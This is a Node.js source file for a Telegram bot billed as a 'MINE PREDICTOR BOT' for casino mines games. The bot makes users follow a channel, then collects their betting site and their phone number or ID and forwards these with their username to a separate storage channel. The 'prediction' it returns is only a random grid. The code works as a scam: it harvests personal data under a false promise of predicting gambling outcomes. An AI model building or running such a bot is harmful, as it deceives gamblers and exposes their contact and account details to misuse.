const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
require("dotenv").config();


const token = process.env.BOT_TOKEN; // Replace with your bot token
const bot = new TelegramBot(token, { polling: true });

const followChannelUsername = '@casinopredictor1'; // The channel users need to follow
const storeChannelUsername = '@vawulites04'; // The channel where user details should be sent

// Store user data
const userData = {};

// Function to check if a user is a member of the follow channel
async function isUserMember(chatId) {
    try {
        const member = await bot.getChatMember(followChannelUsername, chatId);
        return member.status === 'member' || member.status === 'administrator' || member.status === 'creator';
    } catch (error) {
        console.error('Error checking membership:', error);
        return false; // If there's an error, assume the user is not a member
    }
}

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userData[chatId] = {}; // Initialize user data
    bot.sendMessage(chatId, "Hey 👋 welcome to the MINE PREDICTOR BOT Tap the button below to start:", {
        reply_markup: {
            keyboard: [['Start']],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// Handle the start button
bot.onText(/Start/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Please follow this channel: ${followChannelUsername}`, {
        reply_markup: {
            inline_keyboard: [[
                { text: 'Done', callback_data: 'done' }
            ]]
        }
    });
});

// Handle the done button
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'done') {
        const isMember = await isUserMember(chatId);
        if (isMember) {
            bot.sendMessage(chatId, "Thank you for following the channel! Click the button below to submit your details:", {
                reply_markup: {
                    keyboard: [['Submit Details']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else {
            bot.sendMessage(chatId, "It seems you haven't followed the channel yet. Please do so to continue.");
        }
    }
});

// Handle the submit details button
bot.onText(/Submit Details/, async (msg) => {
    const chatId = msg.chat.id;

    // First, ask for the betting site
    bot.sendMessage(chatId, "Please drop your betting site:", {
        reply_markup: {
            force_reply: true // Force reply to get the betting site
        }
    });

    // Listen for the betting site input
    bot.once('message', (msg) => {
        const bettingSite = msg.text;
        userData[chatId].bettingSite = bettingSite; // Store the betting site

        bot.sendMessage(chatId, "Please drop your ID/number with your country code:", {
            reply_markup: {
                force_reply: true // Force reply to get the ID/number
            }
        });

        // Listen for the ID/number input
        bot.once('message', (msg) => {
            const userId = msg.text;
            userData[chatId].userId = userId; // Store the user ID

            bot.sendMessage(chatId, "Thank you! Click the button below to play now:", {
                reply_markup: {
                    keyboard: [['Play Now']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });

            // Send user details to the channel for storage
            const userName = msg.from.username || 'Anonymous'; // Get the user's username (if available)
            const userDetails = `New User Details:
            Username: @${userName}
            Betting Site: ${userData[chatId].bettingSite}
            ID/Phone Number: ${userData[chatId].userId}`;

            // Send the details to the store channel (vawulites04)
            bot.sendMessage(storeChannelUsername, userDetails);
        });
    });
});

// Handle the play now button
bot.onText(/Play Now/, (msg) => {
    const chatId = msg.chat.id;
    const grid = generateGrid();
    bot.sendMessage(chatId, grid, { parse_mode: 'Markdown' });
});

// Function to generate a grid with random gold boxes
function generateGrid() {
    const grid = Array(5).fill().map(() => Array(5).fill('⬛')); // 5x5 grid filled with black boxes
    const positions = new Set();

    while (positions.size < 4) {
        const randomPos = Math.floor(Math.random() * 25);
        positions.add(randomPos);
    }

    positions.forEach(pos => {
        const row = Math.floor(pos / 5);
        const col = pos % 5;
        grid[row][col] = '🟡'; // Gold box
    });

    return grid.map(row => row.join(' ')).join('\n'); // Convert to string
}

// Step 3: Set up Express server
const app = express();
const PORT = process.env.PORT || 3000; // Use environment variable or default to 3000

app.get('/', (req, res) => {
    res.send('Telegram Bot is running!'); // Simple response to check if the server is running
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});